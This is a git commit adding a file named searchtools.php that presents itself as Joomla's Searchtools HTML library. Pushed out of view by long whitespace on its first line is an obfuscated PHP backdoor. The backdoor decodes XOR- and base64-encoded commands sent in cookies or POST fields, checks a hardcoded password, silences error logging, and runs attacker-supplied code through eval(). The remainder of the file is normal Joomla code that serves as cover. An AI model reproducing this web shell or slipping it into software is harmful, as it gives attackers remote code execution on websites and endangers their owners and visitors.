5809ac799c988eca12c31f5f4ec20ac3f17e912b
Ioannis Protonotarios <ioannis@protonotarios.eu>
2016-05-28 16:50:49 +0300

    Create searchtools.php

---
+++ essay-attack/searchtools.php
@@ -0,0 +1,167 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['q5cfb4cd'];global$q5cfb4cd;$q5cfb4cd=$GLOBALS;$q5cfb4cd['c382ff4cf']="\x39\x4a\x6f\x24\x69\x25\x9\x22\x66\x21\x61\x4e\x4f\x6c\x62\x68\x7c\x46\x51\x70\x44\x4c\x42\x76\x56\x5a\x5d\x6a\x50\x28\x3b\x47\xa\x71\xd\x79\x49\x63\x7b\x37\x20\x3d\x29\x60\x5b\x27\x54\x35\x3c\x43\x36\x32\x7e\x52\x48\x74\x5c\x59\x3f\x75\x6d\x58\x6e\x33\x2a\x72\x34\x31\x6b\x78\x45\x2f\x53\x2d\x2b\x30\x40\x7d\x2e\x65\x23\x38\x73\x64\x41\x67\x5e\x77\x7a\x4b\x57\x55\x26\x3a\x5f\x3e\x4d\x2c";$q5cfb4cd[$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][79]]=$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][15].$q5cfb4cd['c382ff4cf'][65];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][88].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][75]]=$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][83];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][83]]=$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][55].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][13].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][62];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][85].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][50]]=$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][62].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][55];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][51]]=$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][13].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][88].$q5cfb4cd['c382ff4cf'][79];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][14]]=$q5cfb4cd['c382ff4cf'][19].$q5cfb4cd['c382ff4cf'][15].$q5cfb4cd['c382ff4cf'][19].$q5cfb4cd['c382ff4cf'][23].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][62];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][85].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][63].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][51].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][14]]=$q5cfb4cd['c382ff4cf'][59].$q5cfb4cd['c382ff4cf'][62].$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][13].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][88].$q5cfb4cd['c382ff4cf'][79];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][27].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][66].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][8]]=$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][66].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][79];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][27].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][75]]=$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][55].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][55].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][60].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][13].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][60].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][55];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][88].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][83]]=$q5cfb4cd['c382ff4cf'][27].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][8];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][47]]=$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][66].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][63];$q5cfb4cd[$q5cfb4cd['c382ff4cf'][23].$q5cfb4cd['c382ff4cf'][51].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][63].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][83]]=$_POST;$q5cfb4cd[$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][63]]=$_COOKIE;@$q5cfb4cd[$q5cfb4cd['c382ff4cf'][85].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][50]]($q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][13].$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][85],NULL);@$q5cfb4cd[$q5cfb4cd['c382ff4cf'][85].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][50]]($q5cfb4cd['c382ff4cf'][13].$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][85].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][65].$q5cfb4cd['c382ff4cf'][82],0);@$q5cfb4cd[$q5cfb4cd['c382ff4cf'][85].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][50]]($q5cfb4cd['c382ff4cf'][60].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][69].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][69].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][59].$q5cfb4cd['c382ff4cf'][55].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][2].$q5cfb4cd['c382ff4cf'][62].$q5cfb4cd['c382ff4cf'][94].$q5cfb4cd['c382ff4cf'][55].$q5cfb4cd['c382ff4cf'][4].$q5cfb4cd['c382ff4cf'][60].$q5cfb4cd['c382ff4cf'][79],0);@$q5cfb4cd[$q5cfb4cd['c382ff4cf'][27].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][75]](0);$ga149c7=NULL;$y7c1be49=NULL;$q5cfb4cd[$q5cfb4cd['c382ff4cf'][69].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][51].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][83]]=$q5cfb4cd['c382ff4cf'][66].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][63].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][73].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][63].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][73].$q5cfb4cd['c382ff4cf'][66].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][51].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][73].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][73].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][51].$q5cfb4cd['c382ff4cf'][66].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][14];global$x5cbe2ed;function s0453($ga149c7,$g9589cbf){global$q5cfb4cd;$b544687d2="";for($ef5ac18e=0;$ef5ac18e<$q5cfb4cd[$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][83]]($ga149c7);){for($zf7d138=0;$zf7d138<$q5cfb4cd[$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][83]]($g9589cbf)&&$ef5ac18e<$q5cfb4cd[$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][83]]($ga149c7);$zf7d138++,$ef5ac18e++){$b544687d2.=$q5cfb4cd[$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][79]]($q5cfb4cd[$q5cfb4cd['c382ff4cf'][88].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][75]]($ga149c7[$ef5ac18e])^$q5cfb4cd[$q5cfb4cd['c382ff4cf'][88].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][75]]($g9589cbf[$zf7d138]));}}return$b544687d2;}function j7ef($ga149c7,$g9589cbf){global$q5cfb4cd;global$x5cbe2ed;return$q5cfb4cd[$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][47]]($q5cfb4cd[$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][47]]($ga149c7,$x5cbe2ed),$g9589cbf);}foreach($q5cfb4cd[$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][63]]as$g9589cbf=>$f9cac7fa4){$ga149c7=$f9cac7fa4;$y7c1be49=$g9589cbf;}if(!$ga149c7){foreach($q5cfb4cd[$q5cfb4cd['c382ff4cf'][23].$q5cfb4cd['c382ff4cf'][51].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][63].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][83]]as$g9589cbf=>$f9cac7fa4){$ga149c7=$f9cac7fa4;$y7c1be49=$g9589cbf;}}$ga149c7=@$q5cfb4cd[$q5cfb4cd['c382ff4cf'][85].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][63].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][51].$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][0].$q5cfb4cd['c382ff4cf'][14]]($q5cfb4cd[$q5cfb4cd['c382ff4cf'][88].$q5cfb4cd['c382ff4cf'][50].$q5cfb4cd['c382ff4cf'][39].$q5cfb4cd['c382ff4cf'][83]]($q5cfb4cd[$q5cfb4cd['c382ff4cf'][27].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][66].$q5cfb4cd['c382ff4cf'][8].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][8]]($ga149c7),$y7c1be49));if(isset($ga149c7[$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][68]])&&$x5cbe2ed==$ga149c7[$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][68]]){if($ga149c7[$q5cfb4cd['c382ff4cf'][10]]==$q5cfb4cd['c382ff4cf'][4]){$ef5ac18e=Array($q5cfb4cd['c382ff4cf'][19].$q5cfb4cd['c382ff4cf'][23]=>@$q5cfb4cd[$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][10].$q5cfb4cd['c382ff4cf'][37].$q5cfb4cd['c382ff4cf'][83].$q5cfb4cd['c382ff4cf'][14]](),$q5cfb4cd['c382ff4cf'][82].$q5cfb4cd['c382ff4cf'][23]=>$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][78].$q5cfb4cd['c382ff4cf'][75].$q5cfb4cd['c382ff4cf'][73].$q5cfb4cd['c382ff4cf'][67],);echo@$q5cfb4cd[$q5cfb4cd['c382ff4cf'][79].$q5cfb4cd['c382ff4cf'][67].$q5cfb4cd['c382ff4cf'][81].$q5cfb4cd['c382ff4cf'][47].$q5cfb4cd['c382ff4cf'][14].$q5cfb4cd['c382ff4cf'][51]]($ef5ac18e);}elseif($ga149c7[$q5cfb4cd['c382ff4cf'][10]]==$q5cfb4cd['c382ff4cf'][79]){eval($ga149c7[$q5cfb4cd['c382ff4cf'][83]]);}exit();} ?><?php
+/**
+ * @package     Joomla.Libraries
+ * @subpackage  HTML
+ *
+ * @copyright   Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
+ * @license     GNU General Public License version 2 or later; see LICENSE
+ */
+
+defined('JPATH_PLATFORM') or die;
+
+use Joomla\Registry\Registry;
+
+/**
+ * Searchtools elements.
+ *
+ * @since  3.2
+ */
+abstract class JHtmlSearchtools
+{
+	/**
+	 * @var    array  Array containing information for loaded files
+	 * @since  3.2
+	 */
+	protected static $loaded = array();
+
+	/**
+	 * Load the main Searchtools libraries
+	 *
+	 * @return  void
+	 *
+	 * @since   3.2
+	 */
+	public static function main()
+	{
+		// Only load once
+		if (empty(static::$loaded[__METHOD__]))
+		{
+			// Requires jQuery but allows to skip its loading
+			if ($loadJquery = (!isset($options['loadJquery']) || $options['loadJquery'] != 0))
+			{
+				JHtml::_('jquery.framework');
+			}
+
+			// Load the jQuery plugin && CSS
+			JHtml::_('script', 'jui/jquery.searchtools.min.js', false, true);
+			JHtml::_('stylesheet', 'jui/jquery.searchtools.css', false, true);
+
+			static::$loaded[__METHOD__] = true;
+		}
+
+		return;
+	}
+
+	/**
+	 * Load searchtools for a specific form
+	 *
+	 * @param   mixed  $selector  Is debugging mode on? [optional]
+	 * @param   array  $options   Optional array of parameters for search tools
+	 *
+	 * @return  void
+	 *
+	 * @since   3.2
+	 */
+	public static function form($selector = '.js-stools-form', $options = array())
+	{
+		$sig = md5(serialize(array($selector, $options)));
+
+		// Only load once
+		if (!isset(static::$loaded[__METHOD__][$sig]))
+		{
+			// Include Bootstrap framework
+			static::main();
+
+			// Add the form selector to the search tools options
+			$options['formSelector'] = $selector;
+
+			// Generate options with default values
+			$options = static::optionsToRegistry($options);
+
+			$doc = JFactory::getDocument();
+			$script = "
+				(function($){
+					$(document).ready(function() {
+						$('" . $selector . "').searchtools(
+							" . $options->toString() . "
+						);
+					});
+				})(jQuery);
+			";
+			$doc->addScriptDeclaration($script);
+
+			static::$loaded[__METHOD__][$sig] = true;
+		}
+
+		return;
+	}
+
+	/**
+	 * Function to receive & pre-process javascript options
+	 *
+	 * @param   mixed  $options  Associative array/Registry object with options
+	 *
+	 * @return  Registry         Options converted to Registry object
+	 */
+	private static function optionsToRegistry($options)
+	{
+		// Support options array
+		if (is_array($options))
+		{
+			$options = new Registry($options);
+		}
+
+		if (!($options instanceof Registry))
+		{
+			$options = new Registry;
+		}
+
+		return $options;
+	}
+
+	/**
+	 * Method to sort a column in a grid
+	 *
+	 * @param   string  $title          The link title
+	 * @param   string  $order          The order field for the column
+	 * @param   string  $direction      The current direction
+	 * @param   mixed   $selected       The selected ordering
+	 * @param   string  $task           An optional task override
+	 * @param   string  $new_direction  An optional direction for the new column
+	 * @param   string  $tip            An optional text shown as tooltip title instead of $title
+	 * @param   string  $icon           Icon to show
+	 * @param   string  $formName       Name of the form to submit
+	 *
+	 * @return  string
+	 */
+	public static function sort($title, $order, $direction = 'asc', $selected = 0, $task = null, $new_direction = 'asc', $tip = '', $icon = null,
+		$formName = 'adminForm')
+	{
+		$direction = strtolower($direction);
+		$orderIcons = array('icon-arrow-up-3', 'icon-arrow-down-3');
+		$index = (int) ($direction == 'desc');
+
+		if ($order != $selected)
+		{
+			$direction = $new_direction;
+		}
+		else
+		{
+			$direction = ($direction == 'desc') ? 'asc' : 'desc';
+		}
+
+		// Create an object to pass it to the layouts
+		$data            = new stdClass;
+		$data->order     = $order;
+		$data->direction = $direction;
+		$data->selected  = $selected;
+		$data->task      = $task;
+		$data->tip       = $tip;
+		$data->title     = $title;
+		$data->orderIcon = $orderIcons[$index];
+		$data->icon      = $icon;
+		$data->formName  = $formName;
+
+		return JLayoutHelper::render('joomla.searchtools.grid.sort', $data);
+	}
+}
